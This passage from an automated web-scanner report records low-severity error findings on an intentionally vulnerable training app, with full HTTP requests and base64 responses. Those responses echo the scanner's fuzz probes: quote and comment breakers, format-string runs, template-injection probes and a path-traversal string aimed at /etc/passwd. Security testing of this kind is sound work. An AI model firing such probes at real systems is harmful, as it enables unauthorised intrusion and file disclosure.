        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[11295, 11359, 11360]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6" var="comment">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="11295">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6?comment=AWvQIRdUANpVKLywQHwweTFi%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:13:57 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="100" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2Pg==</body>
    </http-response>

</http-transaction>
            <http-transaction id="11359">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6?comment=u8UA0efI HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:14:09 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="1249" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5yenFqbyZsdDtyenFqb3J6cWpvLS0mZ3Q7cnpxam9yenFqbyovcnpxam9yenFqbyovOigmcXVvdDsncnpxam9yenFqbzpyenFqb3J6cWpvCnJ6cWpvcnpxam8mcXVvdDtyenFqb3J6cWpvJ3J6cWpvcnpxam9gcnpxam9yenFqbyA9cnpxam88L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZCd6JnF1b3Q7MDwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4mbHQ7IS0tPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPiZxdW90OzwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5xMnJ2bC0tJmd0O3EycnZsPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPjZnM3F3Ki82ZzNxdzwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj44NmxncSovOigmcXVvdDsnODZsZ3E8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+OGhtZnQ6OGhtZnQ8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZXNtd2QnZXNtd2Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZnRib3omcXVvdDtmdGJvejwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5hNGpmZQphNGpmZTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5mdHY0eiA9ZnR2NHo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZzBkN2NgZzBkN2M8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+bWltbm4mbHQ7bWltbm48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+aURvbnRFeGlzdDwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+aFR0cDovL3c0YWYubmV0LzwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj51OFVBMGVmSTwvZGl2Pg==</body>
    </http-response>

</http-transaction>
            <http-transaction id="11360">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6?comment= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:14:09 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="1175" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5yenFqbyZsdDtyenFqb3J6cWpvLS0mZ3Q7cnpxam9yenFqbyovcnpxam9yenFqbyovOigmcXVvdDsncnpxam9yenFqbzpyenFqb3J6cWpvCnJ6cWpvcnpxam8mcXVvdDtyenFqb3J6cWpvJ3J6cWpvcnpxam9gcnpxam9yenFqbyA9cnpxam88L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZCd6JnF1b3Q7MDwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj4mbHQ7IS0tPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPiZxdW90OzwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5xMnJ2bC0tJmd0O3EycnZsPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPjZnM3F3Ki82ZzNxdzwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj44NmxncSovOigmcXVvdDsnODZsZ3E8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+OGhtZnQ6OGhtZnQ8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZXNtd2QnZXNtd2Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZnRib3omcXVvdDtmdGJvejwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5hNGpmZQphNGpmZTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5mdHY0eiA9ZnR2NHo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+ZzBkN2NgZzBkN2M8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+bWltbm4mbHQ7bWltbm48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+aURvbnRFeGlzdDwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj48L2Rpdj4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[11547, 11734, 11735]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7" var="comment">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="11547">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=AWvQIRdUANpVKLywQHwweTFi%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:14:52 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="100" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2Pg==</body>
    </http-response>

</http-transaction>
            <http-transaction id="11734">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=OJTqb44K HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:15:38 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="1362" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj43bGVhaCZsdDs3bGVhaDdsZWFoLS0mZ3Q7N2xlYWg3bGVhaCovN2xlYWg3bGVhaCovOigmcXVvdDsnN2xlYWg3bGVhaDo3bGVhaDdsZWFoCjdsZWFoN2xlYWgmcXVvdDs3bGVhaDdsZWFoJzdsZWFoN2xlYWhgN2xlYWg3bGVhaCA9N2xlYWg8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+cnlkaWImbHQ7cnlkaWI8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Z256cGktLSZndDtnbnpwaTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5iYm5kbiovYmJuZG48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+aTZvanoqLzooJnF1b3Q7J2k2b2p6PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPnduZWlnOnduZWlnPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPm5zZ293Cm5zZ293PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmY3eGtlJnF1b3Q7Zjd4a2U8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+N2YxeG8nN2YxeG88L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Z2Zta3lgZ2Zta3k8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+a293a2sgPWtvd2trPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmQneiZxdW90OzA8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Jmx0OyEtLTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj57bWF0aCBlcXVhdGlvbj0mcXVvdDt4ICogeSZxdW90OyB4PTQ1Mzg4IHk9NDQxMTF9PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JnF1b3Q7PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmlEb250RXhpc3Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPk9KVHFiNDRLPC9kaXY+</body>
    </http-response>

</http-transaction>
            <http-transaction id="11735">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:15:38 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="1329" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj43bGVhaCZsdDs3bGVhaDdsZWFoLS0mZ3Q7N2xlYWg3bGVhaCovN2xlYWg3bGVhaCovOigmcXVvdDsnN2xlYWg3bGVhaDo3bGVhaDdsZWFoCjdsZWFoN2xlYWgmcXVvdDs3bGVhaDdsZWFoJzdsZWFoN2xlYWhgN2xlYWg3bGVhaCA9N2xlYWg8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW4lbiVuJW48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+cnlkaWImbHQ7cnlkaWI8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Z256cGktLSZndDtnbnpwaTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5iYm5kbiovYmJuZG48L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+aTZvanoqLzooJnF1b3Q7J2k2b2p6PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPnduZWlnOnduZWlnPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPm5zZ293Cm5zZ293PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmY3eGtlJnF1b3Q7Zjd4a2U8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+N2YxeG8nN2YxeG88L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Z2Zta3lgZ2Zta3k8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+a293a2sgPWtvd2trPC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmQneiZxdW90OzA8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+Jmx0OyEtLTwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj57bWF0aCBlcXVhdGlvbj0mcXVvdDt4ICogeSZxdW90OyB4PTQ1Mzg4IHk9NDQxMTF9PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+JnF1b3Q7PC9kaXY+PGRpdiBpZD0iY29tbWVudHMiPmlEb250RXhpc3Q8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+PC9kaXY+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[11895, 12210, 12211]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_2" var="fileurl">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;fileurl=&quot; The modified parameter was &quot;fileurl&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="11895">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_2?fileurl=https%3A%2F%2Fgist.githubusercontent.com%2Fraw%2Fbbf2e2183b8f6252061663ce0ddee79b%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:05 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiWyAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBWdWxuZXJhYmxlQXBwXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFZ1bG5lcmFibGVBcHAtZmFjYWRlXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwLWZhY2FkZVwiICB9LCAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBaQVAgSldUIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtand0LWFkZG9uXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFpBUCBGaWxldXBsb2FkIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtZmlsZXVwbG9hZC1hZGRvblwiICB9XSIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
            <http-transaction id="12210">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_2?fileurl=5djghqmV HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="12211">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_2?fileurl= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[12136, 12465, 12468]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3" var="fileurl">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;fileurl=&quot; The modified parameter was &quot;fileurl&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="12136">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3?fileurl=https%3A%2F%2Fgist.githubusercontent.com%2Fraw%2Fbbf2e2183b8f6252061663ce0ddee79b%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:35 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiWyAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBWdWxuZXJhYmxlQXBwXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFZ1bG5lcmFibGVBcHAtZmFjYWRlXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwLWZhY2FkZVwiICB9LCAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBaQVAgSldUIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtand0LWFkZG9uXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFpBUCBGaWxldXBsb2FkIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtZmlsZXVwbG9hZC1hZGRvblwiICB9XSIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

